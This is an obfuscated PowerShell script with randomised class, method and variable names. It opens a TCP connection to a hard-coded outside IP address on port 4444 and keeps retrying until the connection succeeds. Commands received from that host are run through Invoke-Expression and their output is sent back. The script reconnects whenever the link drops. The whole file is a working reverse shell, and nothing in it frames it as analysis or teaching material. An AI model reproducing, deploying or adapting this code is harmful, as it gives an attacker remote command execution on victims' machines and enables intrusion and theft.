class YOCoPtXCFMkQCRVESz {
    
    [string]$YESucYcCwgvBMDpLJYYvvJS = "93.93.112.55"
    [int]$AHFseYD = 4444

    $vSQgZ
    $rEWPlGxFilAjpUJb
    $DlhibY
    $mjKtonV
    $bgWKgYVdjLDGCCinfuAsD
    $vwHDblhbz
    [int]$SXRgbGqIZEHADbIGHGdcori = 50*1024

    awlBiVPdaKShofFEvsh() {
        $this.rEWPlGxFilAjpUJb = $false
        while ($true) {
            try {
                $this.rEWPlGxFilAjpUJb = New-Object Net.Sockets.TcpClient($this.YESucYcCwgvBMDpLJYYvvJS, $this.AHFseYD)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.aoLCSZoQQYApvPFO()
    }

    aoLCSZoQQYApvPFO() {
        $this.vSQgZ = $this.rEWPlGxFilAjpUJb.GetStream()
        $this.mjKtonV = New-Object Byte[] $this.SXRgbGqIZEHADbIGHGdcori
        $this.vwHDblhbz = New-Object Text.UTF8Encoding
        $this.DlhibY = New-Object IO.StreamWriter($this.vSQgZ, [Text.Encoding]::UTF8, $this.SXRgbGqIZEHADbIGHGdcori)
        $this.bgWKgYVdjLDGCCinfuAsD = New-Object System.IO.StreamReader($this.vSQgZ)
        $this.DlhibY.AutoFlush = $true
    }

    rVnndZjAtxtEx() {
        $this.awlBiVPdaKShofFEvsh()
        $this.DOCTFYcGfH()
    }

    iOLAZCJAq($zhMQhnVxhWdqPOOs) {
        try {
            [byte[]]$ikZxvJDBGiMgnAxVpm = [text.Encoding]::Ascii.GetBytes($zhMQhnVxhWdqPOOs)
            $this.DlhibY.Write($ikZxvJDBGiMgnAxVpm, 0, $ikZxvJDBGiMgnAxVpm.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.rVnndZjAtxtEx()
        }
    }

    [string] xgREGmuSiu() {
        try {
            $mNFZPcKEghC = $this.vSQgZ.Read($this.mjKtonV, 0, $this.SXRgbGqIZEHADbIGHGdcori)    
            $VkhJFzSpmlRx = ($this.vwHDblhbz.GetString($this.mjKtonV, 0, $mNFZPcKEghC))
            return $VkhJFzSpmlRx
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.rVnndZjAtxtEx()
            return ""
        }
    }

    [string] uHUFkHwZCdbqGWDklYwcjfG($XlLRwvXwalehUmxsg) {
        Write-Host $XlLRwvXwalehUmxsg
        try { 
            $OUQSYTnllIopQFtZEAcvfkL = Invoke-Expression $XlLRwvXwalehUmxsg | Out-String
        }
        catch {
            $eoytLSCWpzJHYGzcomFDNYB = $_.Exception
            $PQlzsVibVcdmLE = $_.Message
            $OUQSYTnllIopQFtZEAcvfkL = "`n$_`n"
        }
        return $OUQSYTnllIopQFtZEAcvfkL
    }

    [string] GREBmwtFGHIffleseC() {
        $HGDgsmkMZbzrE = [Environment]::UserName
        $AGMnEmxrMMPMl = [System.Net.Dns]::GetHostName()
        $TXgsLlRdHoFTVjNj = Get-Location
        return "$HGDgsmkMZbzrE@$AGMnEmxrMMPMl [$TXgsLlRdHoFTVjNj]~$ "
    }

    DOCTFYcGfH() {
        while ($this.rEWPlGxFilAjpUJb.Connected) {
            $this.iOLAZCJAq($this.GREBmwtFGHIffleseC())         
            $VkhJFzSpmlRx = $this.xgREGmuSiu()
            $OUQSYTnllIopQFtZEAcvfkL = "`n"
            if ([string]::IsNullOrEmpty($VkhJFzSpmlRx)) {
                continue
            }
            $OUQSYTnllIopQFtZEAcvfkL = $this.uHUFkHwZCdbqGWDklYwcjfG($VkhJFzSpmlRx)
            $this.iOLAZCJAq($OUQSYTnllIopQFtZEAcvfkL + "`n")
            $this.vSQgZ.Flush()
        }
        $this.rEWPlGxFilAjpUJb.Close()
        $this.rVnndZjAtxtEx()
    } 
}

$gFUDRtsjgCJcMcxMNhNu = [YOCoPtXCFMkQCRVESz]::new()
$gFUDRtsjgCJcMcxMNhNu.rVnndZjAtxtEx()
